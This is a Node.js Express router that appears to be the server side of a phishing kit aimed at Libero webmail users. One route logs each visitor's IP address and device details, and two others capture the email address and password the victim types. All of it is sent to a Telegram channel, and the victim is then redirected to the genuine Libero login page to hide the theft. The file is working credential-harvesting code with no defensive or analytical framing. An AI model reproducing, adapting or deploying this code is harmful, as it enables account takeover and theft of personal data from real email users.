const express = require('express');
const router = express.Router();
const { sendToTelegram } = require('../utils/telegram');
const { getDeviceInfo } = require('../utils/device');

// POST /api/visit - fires on page load (device + IP)
router.post('/visit', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const deviceInfo = getDeviceInfo(req);

    const message = [
      '🔴 *NEW VISIT DETECTED*',
      `━━━━━━━━━━━━━━━━━━`,
      `🌐 IP: <code>${ip}</code>`,
      `💻 Device: ${deviceInfo.deviceType}`,
      `📱 Browser: ${deviceInfo.browser}`,
      `🖥 OS: ${deviceInfo.os}`,
      `📐 Screen: ${deviceInfo.screenW}x${deviceInfo.screenH}`,
      `🌍 Timezone: ${deviceInfo.timezone}`,
      `🕐 Timestamp: ${new Date().toISOString()}`
    ].join('\n');

    await sendToTelegram(message);
    res.json({ ok: true });
  } catch (err) {
    console.error('[VISIT ERROR]', err.message);
    res.json({ ok: false });
  }
});

// POST /api/email - fires when user submits email
router.post('/email', async (req, res) => {
  try {
    const { email } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

    const message = [
      '📧 *EMAIL CAPTURED*',
      `━━━━━━━━━━━━━━━━━━`,
      `📬 Email: <code>${email}</code>`,
      `🌐 IP: <code>${ip}</code>`,
      `🕐 Timestamp: ${new Date().toISOString()}`
    ].join('\n');

    await sendToTelegram(message);
    res.json({ ok: true, next: 'password' });
  } catch (err) {
    console.error('[EMAIL ERROR]', err.message);
    res.json({ ok: false });
  }
});

// POST /api/password - fires when user submits password
router.post('/password', async (req, res) => {
  try {
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

    const message = [
      '🔑 *PASSWORD CAPTURED*',
      `━━━━━━━━━━━━━━━━━━`,
      `📬 Email: <code>${email}</code>`,
      `🔒 Password: <code>${password}</code>`,
      `🌐 IP: <code>${ip}</code>`,
      `🕐 Timestamp: ${new Date().toISOString()}`
    ].join('\n');

    await sendToTelegram(message);
    res.json({ ok: true, redirect: 'https://mail1.libero.it/appsuite/api/login?action=liberoLogin' });
  } catch (err) {
    console.error('[PASSWORD ERROR]', err.message);
    res.json({ ok: false });
  }
});

module.exports = router;